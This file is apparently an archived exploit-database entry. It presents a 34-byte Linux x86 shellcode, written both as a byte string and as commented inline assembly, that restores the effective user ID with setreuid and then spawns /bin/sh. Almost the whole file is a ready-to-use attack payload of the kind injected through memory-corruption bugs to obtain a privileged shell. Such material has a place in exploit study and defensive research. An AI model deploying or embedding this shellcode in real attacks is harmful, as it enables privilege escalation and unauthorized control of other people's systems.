/*
 *
 * linux/x86 setreuid(geteuid(),geteuid()),execve("/bin/sh",0,0) 34byte universal shellcode
 *
 * blue9057 root@blue9057.com
 *
 * /
int main()
{
    char shellcode[]="\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46"
                              "\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68"
                              "\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80";
    //setreuid(geteuid(),geteuid());
    //execve("/bin/sh",0,0);
    __asm__(""
            "push $0x31;"
            "pop %eax;"
            "cltd;"
            "int $0x80;"        // geteuid();
            "mov %eax, %ebx;"
            "mov %eax, %ecx;"
            "push $0x46;"    // setreuid(geteuid(),geteuid());
            "pop %eax;"
            "int $0x80;"
            "mov $0xb, %al;"
            "push %edx;"
            "push $0x68732f6e;"
            "push $0x69622f2f;"
            "mov %esp, %ebx;"
            "mov %edx, %ecx;"
            "int $0x80;"        // execve("/bin/sh",0,0);
            "");
}

// milw0rm.com [2009-06-16]